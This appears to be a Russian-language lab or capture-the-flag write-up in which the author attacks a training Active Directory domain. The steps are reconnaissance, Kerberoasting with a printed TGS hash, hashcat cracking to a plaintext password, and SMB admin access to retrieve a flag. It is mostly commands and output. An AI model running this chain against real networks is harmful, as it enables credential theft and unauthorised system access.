
#### Описание

Получите доступ к файлу flag.txt на узле shpoint.edu.stf.
Подсказки не отображаются при отключенном VPN. Чтобы их просмотреть, настройте VPN-подключение.


---
Креды:
s_dotson  ricardo
r_andrews  dancer
domain edu.stf

Резюмируя решение:

Разведуем nmap and nslookup.
-    Выписываем интерисующие нас данные
Далее идем на айпи 16.134 где у нас есть dns и порты для kerberos
-  используем GetUserSPNs.py для  получение токена 
- брутим токен 
Возвращаемся на машинку 106 и смотрим что у нас есть и куда может тыкнуть эти креды, тыкаем подходят даже на сокете, не известно пока зачем он нужен но не забываем про него
- находим smb куда подхоядт наши креды и забираем флаг 

В ходе решения и поиска истины были выписаны не нужные сведения, но я их оставил вдруг потом пригодятся 



---
#### Ip and nmap 

Наша цель shpoint узнаем от ДНС(134) ее айпи 
```
nslookup  shpoint.edu.stf 10.154.16.134                 
Server:         10.154.16.134
Address:        10.154.16.134#53

Name:   shpoint.edu.stf
Address: 10.154.16.106
```


```
nmap -Pn -p- 10.154.16.106       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 11:37 EST
Nmap scan report for 10.154.16.106
Host is up (0.013s latency).
Not shown: 65512 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
808/tcp   open  ccproxy-http
1720/tcp  open  h323q931
2019/tcp  open  whosockami
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
22233/tcp open  unknown
22234/tcp open  unknown
22236/tcp open  unknown
32843/tcp open  unknown
32844/tcp open  unknown
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49728/tcp open  unknown
49733/tcp open  unknown
49766/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 4.80 seconds

```



---


```
 nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='edu.stf' -Pn userdb='/usr/share/wordlists/rockyou.txt' 10.154.16.134      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 12:19 EST
Unable to split netmask from target expression: "userdb=/usr/share/wordlists/rockyou.txt"
Nmap scan report for 10.154.16.134
Host is up (0.0065s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|_    administrator@edu.stf

Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds

```



```
┌──(kali㉿kali)-[~]
└─$ nmap -A 10.154.16.106      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 06:13 EST
Nmap scan report for 10.154.16.106
Host is up (0.042s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc?
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
808/tcp  open  ccproxy-http?
1720/tcp open  h323q931?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: edu
|   NetBIOS_Domain_Name: edu
|   NetBIOS_Computer_Name: SHPOINT
|   DNS_Domain_Name: edu.stf
|   DNS_Computer_Name: shpoint.edu.stf
|   DNS_Tree_Name: edu.stf
|   Product_Version: 10.0.17763
|_  System_Time: 2024-12-18T11:15:56+00:00
| ssl-cert: Subject: commonName=shpoint.edu.stf
| Not valid before: 2024-07-18T10:54:48
|_Not valid after:  2025-01-17T10:54:48
|_ssl-date: 2024-12-18T11:16:24+00:00; -3s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
| smb2-time: 
|   date: 2024-12-18T11:15:59
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 187.45 seconds

```



#### Попытка подключения по RDP

```
rdesktop 10.154.16.106
Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses and invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.

     Issuer: CN=shpoint.edu.stf


Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate the connection atempt will be aborted:

    Subject: CN=shpoint.edu.stf
     Issuer: CN=shpoint.edu.stf
 Valid From: Thu Jul 18 06:54:48 2024
         To: Fri Jan 17 05:54:48 2025

  Certificate fingerprints:

       sha1: 357a5dff3baad2b0f107d3e319e75df1b6a2f3d9
     sha256: 9f79708ec3a91c2e84610ec2fe308a2a41402c724f48f20fbd44c0c86483e440


Do you trust this certificate (yes/no)? yes
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Connection established using SSL.

```


#### bloodhound не нужно 


```
bloodhound-python -u r_andrews -p dancer -ns 10.154.16.135 -d edu.stf -c All -o output2.json
INFO: Found AD domain: edu.stf
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc-2.edu.stf:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.edu.stf
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 19 computers
INFO: Connecting to LDAP server: dc.edu.stf
INFO: Found 51 users
INFO: Found 76 groups
INFO: Found 22 gpos
INFO: Found 13 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: mholden.edu.stf
INFO: Querying computer: grodriquez.edu.stf
INFO: Querying computer: exchange.edu.stf
INFO: Querying computer: JHEBERT.edu.stf
INFO: Querying computer: MMCDOWELL.edu.stf
INFO: Querying computer: lblackburn.edu.stf
INFO: Querying computer: cblair.edu.stf
INFO: Querying computer: cfrazier.edu.stf
INFO: Querying computer: sdotson.edu.stf
INFO: Querying computer: tmathis.edu.stf
INFO: Querying computer: ekelly.edu.stf
INFO: Querying computer: hmorgan.edu.stf
INFO: Querying computer: smoses.edu.stf
INFO: Querying computer: lshepherd.edu.stf
INFO: Querying computer: shpoint.edu.stf
INFO: Querying computer: mssql.edu.stf
INFO: Querying computer: backup.edu.stf
INFO: Querying computer: dc-2.edu.stf
INFO: Querying computer: dc.edu.stf
INFO: Done in 00M 09S

```


#### ldap не нужно 

```
ldapsearch -x -H ldap://10.154.16.134 -D "CN=Ralf Andrews,CN=Users,DC=edu,DC=stf" -W -b "DC=edu,DC=stf" "(objectClass=*)"

# sharepoint_spn, Users, edu.stf
dn: CN=sharepoint_spn,CN=Users,DC=edu,DC=stf
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: sharepoint_spn
givenName: sharepoint_spn
distinguishedName: CN=sharepoint_spn,CN=Users,DC=edu,DC=stf
instanceType: 4
whenCreated: 20240228114521.0Z
whenChanged: 20240305150606.0Z
displayName: sharepoint_spn
uSNCreated: 110911
uSNChanged: 157229
name: sharepoint_spn
objectGUID:: yXLOa1cJTk6O4JdERGhEOQ==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133535943219047527
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAeNoxsLGMEzWI45g0ngQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: sharepoint_spn
sAMAccountType: 805306368
userPrincipalName: sharepoint_spn@edu.stf
lockoutTime: 0
servicePrincipalName: shpoint/sharepoint_spn.edu.stf:60111
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=edu,DC=stf
dSCorePropagationData: 20240228114521.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133541247660058631

```


```
nmap -p 389,636 10.154.16.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 10:44 EST
Nmap scan report for 10.154.16.65
Host is up (0.023s latency).

PORT    STATE  SERVICE
389/tcp closed ldap
636/tcp closed ldapssl

Nmap scan report for 10.154.16.74
Host is up (0.0075s latency).

PORT    STATE  SERVICE
389/tcp closed ldap
636/tcp closed ldapssl

Nmap scan report for 10.154.16.75
Host is up (0.024s latency).

PORT    STATE  SERVICE
389/tcp closed ldap
636/tcp closed ldapssl

Nmap scan report for 10.154.16.76
Host is up (0.024s latency).

PORT    STATE  SERVICE
389/tcp closed ldap
636/tcp closed ldapssl

Nmap scan report for 10.154.16.100
Host is up (0.019s latency).

PORT    STATE  SERVICE
389/tcp closed ldap
636/tcp closed ldapssl

Nmap scan report for 10.154.16.104
Host is up (0.019s latency).

PORT    STATE  SERVICE
389/tcp closed ldap
636/tcp closed ldapssl

Nmap scan report for 10.154.16.105
Host is up (0.018s latency).

PORT    STATE  SERVICE
389/tcp closed ldap
636/tcp closed ldapssl

Nmap scan report for 10.154.16.106
Host is up (0.018s latency).

PORT    STATE  SERVICE
389/tcp closed ldap
636/tcp closed ldapssl

Nmap scan report for 10.154.16.107
Host is up (0.018s latency).

PORT    STATE  SERVICE
389/tcp closed ldap
636/tcp closed ldapssl

Nmap scan report for 10.154.16.196
Host is up (0.020s latency).

PORT    STATE  SERVICE
389/tcp closed ldap
636/tcp closed ldapssl

Nmap scan report for 10.154.16.197
Host is up (0.020s latency).

PORT    STATE  SERVICE
389/tcp closed ldap
636/tcp closed ldapssl

Nmap scan report for 10.154.16.198
Host is up (0.020s latency).

PORT    STATE  SERVICE
389/tcp closed ldap
636/tcp closed ldapssl

Nmap scan report for 10.154.16.201
Host is up (0.013s latency).

PORT    STATE  SERVICE
389/tcp closed ldap
636/tcp closed ldapssl

Nmap scan report for 10.154.16.202
Host is up (0.020s latency).

PORT    STATE  SERVICE
389/tcp closed ldap
636/tcp closed ldapssl

Nmap scan report for 10.154.16.203
Host is up (0.012s latency).

PORT    STATE  SERVICE
389/tcp closed ldap
636/tcp closed ldapssl

Nmap scan report for 10.154.16.204
Host is up (0.024s latency).

PORT    STATE  SERVICE
389/tcp closed ldap
636/tcp closed ldapssl

Nmap scan report for 10.154.16.205
Host is up (0.014s latency).

PORT    STATE  SERVICE
389/tcp closed ldap
636/tcp closed ldapssl

Nmap scan report for 10.154.16.208
Host is up (0.019s latency).

PORT    STATE  SERVICE
389/tcp closed ldap
636/tcp closed ldapssl

Nmap done: 256 IP addresses (18 hosts up) scanned in 11.06 seconds

```

 
 
#### GetUserSPNs.py получение токена 
обращаемся к домену 134 где есть и днс и порты от kerberos
```
python3  GetUserSPNs.py -dc-ip  10.154.16.134 edu.stf/s_dotson:ricardo
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

ServicePrincipalName                  Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
------------------------------------  --------------  --------  --------------------------  ---------  ----------
shpoint/sharepoint_spn.edu.stf:60111  sharepoint_spn            2024-02-28 06:45:21.904753  <never>               
```
Получаем новую учетку и хэшь к ней , что может быть еще лучше?
```
python3  GetUserSPNs.py -dc-ip  10.154.16.135 edu.stf/r_andrews:dancer -request
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

ServicePrincipalName                  Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
------------------------------------  --------------  --------  --------------------------  ---------  ----------
shpoint/sharepoint_spn.edu.stf:60111  sharepoint_spn            2024-02-28 06:45:21.904753  N/A                   



[-] CCache file is not found. Skipping...
$krb5tgs$23$*sharepoint_spn$EDU.STF$edu.stf/sharepoint_spn*$13ab6318eb87acc07b970daa25b5a417$fbaa058a68dee4d74887d175753edbbaadf303f8c37add91f3d7c52eb3c276dc72c917b54b344f2fdfe8ee23c8a7d0f52de80a0026b33cf2d82ae869d3973c012f7c609822646cc2bca6063d35f43076c1563fbd2f89fd64419982f3ee29c71b1af2340056d03da264b06fe4baa6096e95920ff9e09f17d1e4c9ee693039b346241e7dd79e61c7c1792250dd747b642c7efcfa2842e2e9ae26e131bd940f42e7d678bc6c382b3708c1b432dbe7fe95aaebe343f55ec7344011d501a6411e325a5b898ecb008205e59c69d7ff5b512801fa0cf8dceede1a580ac64efaa39607e51ad96ce7003433dbeef2006293e48f2d215c8d87faac56efd8e0ada38dc0e4265bd6ba63a7b391b199d33d97dbd1ec5d0f8a37e3f38ed5066f6a16e5351316ac0fff7851c2463bf2077a303a1aed8c1e6efbf5af01c09ee04edc0cb65adab9e405b254356e48689a2c1de00ec3a9a88fbd059f3e874fe3b4f49d1c8e239711b2d3c7fc550bf962cf0ccb58c8fdd6266597f725be17bda758b9608e249f9374a7500719b87211fd3c846378f53716a1823d89a123c0192f55dcff0e47c6831ad595a44effa1b6ba6126e223085d22384cd84f911f17193994245269926d07907f72fb791aab5e9dd34ff8a3d4ab4674a9bd4cc7f2c42f0129856e231aa1054cdf08c07ca745658fb133902bb9cd93a14d61a46cb2559ac3e4cc7f0ada3d307b54eb84a01a1da256576812f1f71a95c06138cc87ae773026e4d40a5e68555f2629ebe50c2e22209b49882325386f0db13fe46b731f754109982e7075740d274ad7c0ee2fdfa038b088d24c473e63dce44b00d3273d16fcab222ed9f82a82ca0f4efb63d21c369f85c30254ed004bdc07f3c47d8417da8bf3736e2a26dc3f222799fe99c0f1feab8725e7e040d527ca6fed267f63b9ba9b4ec45a5dfc483d65f92931825434d447a4dc55c386df492e9fac6e76d8ef28725a8dbb2cd447a9dd611617e7facabbb3483d6b2b2a21c6694021d36ada93b5e862f835bc0bd76f72e32fbf10567f8ed0a79072c744e7175eba5a81032001d88feca9d1b38b967750283809e2ceb87e0dd87e02944ba040a493dff6c09ac4c32fa44d1f987cef50d0b1d6eaa67f85d65e7fd5f59ce4e6feb1f25e1d5aa791c3aa395efe48756da0cf67531c85e9ec3c8696949ddbe925d0da767fde17535e83aaae4fd08c7a11769500422244efd5a4483010f854a41757400d748ba516920cab63cf3f922cd4484ef1b898b756c2c36a16d3a2babd4245d4e964df7f53e932407dc964e0862601d6f4837025c2ea3646cebf4586b9c719a98270f02777b4b14f6e903f3b3e949a5863a28db086de71d73758515ab0446053c9a814afe7863467eb5b6a269ef96eedd0a45eb8b9333dfcae56e423836635655e1c12e7bcffad4216277c3b6e475e097450d1334b4b1ece3c2559d15973713e8adac139b0b5dce6881f23ad9a1392170fa755

```

ДАлее сохраняю  
и ищем чем брутить 

```
└─$ hashcat --help | grep Kerberos
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP 
```

`krb5tgs$23$...` — это форматированный хеш, который указывает, что это хеш Kerberos TGS, использующий etype 23 (AES-256).
(выбрал 13100 так как видел что его использовали )
```
hashcat -m 13100 hash_135_sharepoint2 /usr/share/wordlists/rockyou.txt 

killer
```

домен shpoint.edu.stf
sharepoint_spn:killer

+. не забываем записать новые креды к осталным 
 
 

#### 2019 порт port на потом 
хз зачем это мб потом нужно будет , креды подходят с паролем killer
![[Pasted image 20241219143650.png]]

#### 135 на потом 
НЕ с первой попыкти сработало 
```
┌──(kali㉿kali)-[~]
└─$ rpcclient -U sharepoint_spn -W edu.stf 10.154.16.106 

Password for [EDU.STF\sharepoint_spn]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[DefaultAccount] rid:[0x1f7]
user:[Guest] rid:[0x1f5]
user:[ptadmin] rid:[0x3e8]
user:[siem_user] rid:[0x3e9]
user:[WDAGUtilityAccount] rid:[0x1f8]
rpcclient $> enumdomgroups
group:[None] rid:[0x201]
rpcclient $> srvinfo
        10.154.16.106  Wk Sv NT SNT         
        platform_id     :       500
        os version      :       10.0
        server type     :       0x9003
rpcclient $> srvinfo
        10.154.16.106  Wk Sv NT SNT         
        platform_id     :       500
        os version      :       10.0
        server type     :       0x9003
rpcclient $> querydominfo
Domain:         SHPOINT
Server:
Comment:
Total Users:    5
Total Groups:   1
Total Aliases:  3
Sequence No:    1
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
 

```

```
rpcclient -U sharepoint_spn%killer -W edu.stf 10.154.16.106
```
#### Samba

```
└─$ smbmap -H 10.154.16.106 -u sharepoint_spn -p killer -d shpoint.edu.stf


    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 0 SMB connections(s) and 0 authenticated session(s)                                                      
[*] Closed 0 connections                                                                                                     
                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ smbmap -H 10.154.16.106 -u sharepoint_spn -p killer -d edu.stf        


    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.154.16.106:445       Name: shpoint.edu.stf           Status: ADMIN!!!   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    READ ONLY       Remote IPC
[*] Closed 1 connections                                                                                                     
                          
```

```
smbclient //10.154.16.106/C$ -U sharepoint_spn%killer -W edu.stf --option='client min protocol=SMB2'
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Wed Feb 28 06:53:14 2024
  Documents and Settings          DHSrn        0  Thu Dec  6 23:26:51 2018
  flag.txt                            A       38  Thu Dec 26 03:31:26 2024
  inetpub                             D        0  Mon Feb 19 05:42:21 2024
  PerfLogs                            D        0  Sat Jul 10 14:48:12 2021
  Program Files                      DR        0  Fri Jul 19 07:11:58 2024
  Program Files (x86)                 D        0  Mon Feb 19 05:51:07 2024
  ProgramData                       DHn        0  Tue Feb 20 07:15:00 2024
  pt                                  D        0  Fri Jul 19 07:09:18 2024
  Recovery                         DHSn        0  Mon Feb 19 05:34:29 2024
  System Volume Information         DHS        0  Thu Dec  6 23:25:01 2018
  TEMP                                D        0  Sun Dec 22 19:11:05 2024
  Users                              DR        0  Tue Mar  5 10:21:45 2024
  Windows                             D        0  Tue Dec 24 04:51:32 2024

                31316223 blocks of size 4096. 22606804 blocks available
smb: \> get flag.txt

```

